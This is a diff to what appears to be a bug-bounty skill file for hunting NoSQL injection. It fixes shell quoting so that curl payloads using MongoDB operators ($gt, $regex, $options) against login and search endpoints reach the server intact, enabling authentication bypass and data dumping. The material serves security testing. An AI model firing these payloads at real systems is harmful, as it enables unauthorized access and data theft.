@@ -1,6 +1,6 @@
 ---
 name: hunt-nosqli
-description: Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.
+description: "Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages."
 sources: hackerone_public
 report_count: 14
 ---
@@ -70,12 +70,14 @@ curl -s -X POST https://$TARGET/api/login \
 ### Phase 2 — URL Parameter Injection
 ```bash
 # Array notation (Express/PHP-style)
-curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
-curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"
+# NOTE: single-quote the operator portions so $gt/$regex/$options reach the server
+# literally — inside double quotes the shell expands $gt etc. to empty strings.
+curl "https://$TARGET/api/users?username[\$gt]=&password[\$gt]="
+curl "https://$TARGET/api/search?q[\$regex]=.*&q[\$options]=i"
 
 # POST form data
 curl "https://$TARGET/api/login" \
-  --data "username[$gt]=&password[$gt]="
+  --data 'username[$gt]=&password[$gt]='
 ```
 
 ### Phase 3 — $where Blind Injection (time-based)
